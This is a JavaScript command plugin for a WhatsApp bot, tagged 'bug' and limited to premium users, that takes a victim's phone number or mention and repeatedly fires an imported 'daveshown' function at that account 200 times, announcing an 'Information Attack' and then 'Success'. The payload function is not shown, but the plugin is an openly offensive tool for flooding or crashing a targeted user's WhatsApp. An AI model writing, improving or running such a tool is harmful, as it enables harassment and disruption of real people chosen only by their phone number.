const axios = require("axios");

let daveplug = async (m, { daveshown, reply, text, isPremium, prefix, command, dave, sleep }) => {
    if (!isPremium) return reply('💠 This command is for premium users only');
    if (!text) return reply(`💠 *Format Invalid!*\nUse: ${prefix + command} 254xxx`);
    
    let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'');
    let isTarget = client + "@s.whatsapp.net";

    await dave.sendMessage(m.chat, { react: { text: '💠', key: m.key } });

    let processMsg = `💠 *Information Attack*
💠 *Sender:* ${m.pushName}
💠 *Target:* ${client}
💠 *Status:* ⏳ Processing...`;
    
    await dave.sendMessage(m.chat, { react: { text: '💠', key: m.key } });
    reply(processMsg);

    for (let r = 0; r < 50; r++) {
        await daveshown(isTarget);
        await sleep(5000);
        await daveshown(isTarget);
        await daveshown(isTarget);
        await sleep(5000);
        await daveshown(isTarget);
    }

    let finalMsg = `💠 *Information Attack*
💠 *Sender:* ${m.pushName}
💠 *Target:* ${client}
💠 *Status:* Success`;
    
    await dave.sendMessage(m.chat, { react: { text: '💠', key: m.key } });
    reply(finalMsg);
};

daveplug.help = ['dave'];
daveplug.tags = ['bug'];
daveplug.command = ['dave'];

module.exports = daveplug;